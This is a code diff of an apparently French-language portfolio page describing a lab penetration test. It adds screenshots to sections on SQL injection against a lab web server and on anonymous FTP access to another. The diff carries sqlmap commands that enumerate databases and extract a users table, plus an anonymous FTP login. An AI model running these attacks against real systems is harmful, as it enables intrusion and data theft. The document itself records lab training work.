@@ -60,18 +60,50 @@
         </li>
 
         <li>
-          <h4>Exploitation — Injection SQL (WebServer1)</h4>
-          <p>Analyse automatisée et extraction (exemples illustratifs, réalisés en lab) :</p>
-          <pre><code>sqlmap -u "http://192.168.44.101/login.php" --forms --batch --level=5 --risk=3</code></pre>
-          <pre><code>sqlmap -u "http://192.168.44.101/login.php" --data "username=admin&password=test" --dbs</code></pre>
-          <p>Exfiltration contrôlée d’une table `users` (démonstration d’impact).</p>
-        </li>
+            <h4>Exploitation — Injection SQL (WebServer1)</h4>
+            <p>Analyse automatisée et extraction (exemples illustratifs, réalisés en lab) :</p>
+            <pre><code>sqlmap -u "http://192.168.44.101/login.php" --forms --batch --level=5 --risk=3</code></pre>
+            <pre><code>sqlmap -u "http://192.168.44.101/login.php" --data "username=admin&password=test" --dbs</code></pre>
+          
+            <p>Résultat : découverte des bases disponibles et exfiltration contrôlée de la table <code>users</code> :</p>
+          
+            <figure class="arch-figure">
+              <img src="../assets/projet2/webserver1_sql_injection_dbs.png"
+                   alt="Résultat SQLmap — bases de données listées" class="arch-image"/>
+              <figcaption>SQLmap — Bases de données identifiées (MySQL/MariaDB)</figcaption>
+            </figure>
+          
+            <figure class="arch-figure">
+              <img src="../assets/projet2/webserver1_sql_injection_rows.png"
+                   alt="Résultat SQLmap — exfiltration de la table users" class="arch-image"/>
+              <figcaption>SQLmap — Exfiltration contrôlée de la table <code>users</code></figcaption>
+            </figure>
+          </li>
+          
 
         <li>
           <h4>Exploitation — FTP mal configuré (WebServer2)</h4>
           <p>Connexion anonyme et récupération de fichiers sensibles :</p>
           <pre><code>ftp 192.168.44.102
 # username: anonymous</code></pre>
+
+<figure class="arch-figure">
+    <img src="../assets/projet2/webserver2_ftp_attack1.png"
+         alt="Résultat SQLmap — bases de données listées" class="arch-image"/>
+    <figcaption>Le port 21 est ouvert sur la cible</figcaption>
+  </figure>
+
+  <figure class="arch-figure">
+    <img src="../assets/projet2/webserver2_ftp_attack2.png"
+         alt="Résultat SQLmap — exfiltration de la table users" class="arch-image"/>
+    <figcaption> </figcaption>
+  </figure>
+
+  <figure class="arch-figure">
+    <img src="../assets/projet2/webserver2_ftp_attack4.png"
+         alt="Résultat SQLmap — exfiltration de la table users" class="arch-image"/>
+    <figcaption>connexion anonyme possible </figcaption>
+  </figure>
           <p>Navigation vers `/secret` et téléchargement des fichiers exposés.</p>
         </li>
 
